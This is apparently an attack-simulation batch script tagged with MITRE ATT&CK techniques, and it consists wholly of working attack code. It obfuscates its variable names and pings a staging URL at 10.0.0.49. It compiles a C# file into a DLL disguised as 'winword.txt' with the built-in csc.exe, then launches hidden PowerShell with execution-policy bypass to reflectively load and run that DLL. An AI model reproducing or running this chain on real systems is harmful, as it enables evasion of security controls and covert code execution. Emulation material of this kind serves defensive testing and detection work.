@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8507\d1213e9b
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8507-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=winword.txt
SET njozco=file.txt
SET kkjwr=8507
SET xgepp=%APPDATA%\!ufeybybm!\macula-simulations.log
SET grhkhp=%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe
SET fjrym=PowerShell.exe
SET rrqdh=1
SET aizpg=

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat=starting>> "!xgepp!" 2>nul
curl -k -s -o nul "!uouoq!"
if !errorlevel! equ 0 (
    SET rrqdh=1
    SET aizpg=
) else (
    SET rrqdh=0
    SET aizpg=connection_failed
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat=!rrqdh!>> "!xgepp!" 2>nul
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!rrqdh!:!aizpg!>> "!xgepp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir=!recnn!>> "!xgepp!" 2>nul
cd /d "!recnn!" 2>nul
if !errorlevel! neq 0 (
    SET rrqdh=0
    SET aizpg=invalid_directory
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir=!rrqdh!>> "!xgepp!" 2>nul
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!rrqdh!:!aizpg!>> "!xgepp!" 2>nul
    exit /b 1
)
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir=success>> "!xgepp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_start=!njozco!>> "!xgepp!" 2>nul
"!grhkhp!" /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
if !errorlevel! equ 0 (
    SET rrqdh=1
    SET aizpg=
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=success>> "!xgepp!" 2>nul
) else (
    SET rrqdh=0
    SET aizpg=compilation_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compile_complete=!rrqdh!>> "!xgepp!" 2>nul
    echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!rrqdh!:!aizpg!>> "!xgepp!" 2>nul
    exit /b 1
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=!rrqdh!:!aizpg!>> "!xgepp!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: powershell_exec=starting>> "!xgepp!" 2>nul
"!fjrym!" -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }"
if !errorlevel! equ 0 (
    SET rrqdh=1
    SET aizpg=
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: powershell_exec=success>> "!xgepp!" 2>nul
) else (
    SET rrqdh=0
    SET aizpg=assembly_load_failed
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: powershell_exec=!rrqdh!>> "!xgepp!" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!rrqdh!:!aizpg!>> "!xgepp!" 2>nul